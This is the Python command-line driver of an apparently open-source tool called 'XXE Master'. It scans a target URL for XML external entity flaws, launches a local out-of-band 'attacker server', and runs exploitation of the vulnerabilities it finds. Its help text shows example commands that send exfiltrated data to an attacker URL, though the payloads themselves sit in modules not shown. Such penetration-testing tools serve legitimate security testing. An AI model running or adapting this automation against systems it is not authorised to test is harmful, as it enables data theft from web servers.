import argparse
import time
import pyfiglet
import subprocess
from colorama import Fore, Style, init
from src.xxeDetector import XXEDetector
from payloads.payloads import Payloads

init(autoreset=True)

def print_logo():

    banner = f"""{Fore.GREEN}
                                                                       /$$                        
                                                                      | $$                        
 /$$   /$$/$$   /$$  /$$$$$$        /$$$$$$/$$$$   /$$$$$$   /$$$$$$$/$$$$$$    /$$$$$$   /$$$$$$ 
|  $$ /$$/  $$ /$$/ /$$__  $$      | $$_  $$_  $$ |____  $$ /$$_____/_  $$_/   /$$__  $$ /$$__  $$
 \  $$$$/ \  $$$$/ | $$$$$$$$      | $$ \ $$ \ $$  /$$$$$$$|  $$$$$$  | $$    | $$$$$$$$| $$  \__/
  >$$  $$  >$$  $$ | $$_____/      | $$ | $$ | $$ /$$__  $$ \____  $$ | $$ /$$| $$_____/| $$      
 /$$/\  $$/$$/\  $$|  $$$$$$$      | $$ | $$ | $$|  $$$$$$$ /$$$$$$$/ |  $$$$/|  $$$$$$$| $$      
|__/  \__/__/  \__/ \_______/$$$$$$|__/ |__/ |__/ \_______/|_______/   \___/   \_______/|__/      
                           |______/                                                               
                                                                                                  
                                                                                                  
{Style.RESET_ALL}
    {Fore.YELLOW}═══════════════════════════════════════════════════════════════════════════
            XXE MASTER - ADVANCED XXE DETECTION & EXPLOITATION TOOL  
                  Developed by: El13  
    ═══════════════════════════════════════════════════════════════════════════{Style.RESET_ALL}
    
    {Fore.RED}                               DISCLAIMER
    This tool is for ethical hacking, legal, and educational use only.
                Any illegal use is strictly prohibited.{Style.RESET_ALL}
"""
    print(banner)

def print_help():
    help_text = f"""
{Fore.GREEN}Usage:{Style.RESET_ALL}
    python xmaster.py <URL> [OPTIONS]

{Fore.YELLOW}Required Arguments:{Style.RESET_ALL}
    {Fore.CYAN}<URL>{Style.RESET_ALL}                         Target URL for XXE scanning
    {Fore.CYAN}--attacker-url, -Aurl <URL>{Style.RESET_ALL}   Attacker's OOB server for exfiltration

{Fore.YELLOW}Optional Arguments:{Style.RESET_ALL}
    {Fore.CYAN}--custom-payload, -cp <FILE>{Style.RESET_ALL}  Use a custom payload file for XXE testing
    {Fore.CYAN}--port, -p <PORT>{Style.RESET_ALL}             Port for the OOB listener (default: 8000)
    {Fore.CYAN}--delay, -d <SECONDS>{Style.RESET_ALL}         Delay (in seconds) between each payload execution (default: 2)
    {Fore.CYAN}--help, -h{Style.RESET_ALL}                    Show this help menu and exit

{Fore.YELLOW}Examples:{Style.RESET_ALL}
    {Fore.CYAN}Scan a target with default settings:{Style.RESET_ALL}
        python xmaster.py http://www.example.com --attacker-url http://localhost:8000/exfiltrate

    {Fore.CYAN}Scan with a custom payload:{Style.RESET_ALL}
        python xmaster.py http://www.example.com --attacker-url http://localhost:8000/exfiltrate -cp payload.xml

    {Fore.CYAN}Scan with a delay and a custom port:{Style.RESET_ALL}
        python xmaster.py http://www.example.com --attacker-url http://localhost:8000/exfiltrate --port 9000 --delay 5

{Fore.LIGHTCYAN_EX}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Style.RESET_ALL}
"""
    print(help_text)

VERSION = "2.1.1"

def start_attacker_server(port):
    """
    Starts the attacker server in the background.
    """
    try:
        server_process = subprocess.Popen(
            ['python', 'attacker_server.py', '--port', str(port)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        print(Fore.GREEN + f"[*] Attacker server started on http://0.0.0.0:{port}")
        return server_process
    except Exception as e:
        print(Fore.RED + f"[!] Failed to start attacker server: {e}")
        exit(1)

def stop_attacker_server(server_process):
    """
    Stops the attacker server gracefully.
    """
    try:
        server_process.terminate()
        print(Fore.RED + "[*] OOB server stopped.")
    except Exception as e:
        print(Fore.RED + f"[!] Error stopping the attacker server: {e}")

def main():
    print_logo()

    parser = argparse.ArgumentParser(add_help=False) 
    parser.add_argument("url", type=str, nargs="?", help="Target URL for XXE scanning")
    parser.add_argument("--attacker-url", "-Aurl", required=False, help="Attacker URL for data exfiltration")
    parser.add_argument("--custom-payload", "-cp", type=str, help="File path to a custom payload to use for testing")
    parser.add_argument("--port", "-p", type=int, default=8000, help="Port for the OOB server (default: 8000)")
    parser.add_argument("--delay", "-d", type=int, default=2, help="Delay (in seconds) between payload execution")
    parser.add_argument("--help", "-h", action="store_true", help="Show this help menu and exit")

    args = parser.parse_args()

    if args.help or args.url is None:
        print_help()
        exit(0)

    if not args.attacker_url:
        print(Fore.RED + "[!] Error: --attacker-url is required. Use --help for more information.")
        exit(1)

    server_process = start_attacker_server(args.port)

    try:
        detector = XXEDetector(args.url, delay=args.delay) 

        if args.custom_payload:
            print(Fore.YELLOW + f"[*] Using custom payload from: {args.custom_payload}")
            try:
                with open(args.custom_payload, 'r') as file:
                    custom_payload = file.read()
                    result = detector.send_and_detect(custom_payload, args.attacker_url)

                    if result:
                        print(Fore.YELLOW + "[*] Vulnerability detected with custom payload:")
                        print(Fore.RED + f"Payload: {result['payload']}")
                        print(Fore.GREEN + f"Response: {result['response']}")
                    else:
                        print(Fore.GREEN + "[!] No vulnerabilities detected with the custom payload.")
            except Exception as e:
                print(Fore.RED + f"[!] Error reading custom payload: {e}")
        else:
            vulnerabilities = detector.detect_xxe_vulnerabilities(args.attacker_url)

            for vuln in vulnerabilities:
                print(Fore.RED + str(vuln))
                time.sleep(args.delay) 

            if vulnerabilities:
                print(Fore.YELLOW + "[*] Exploiting detected vulnerabilities...")
                for vuln in vulnerabilities:
                    detector.exploit_xxe(vuln['payload'])
                    time.sleep(args.delay) 
            else:
                print(Fore.GREEN + "[!] No vulnerabilities detected.")

    finally:
        stop_attacker_server(server_process)

if __name__ == "__main__":
    main()
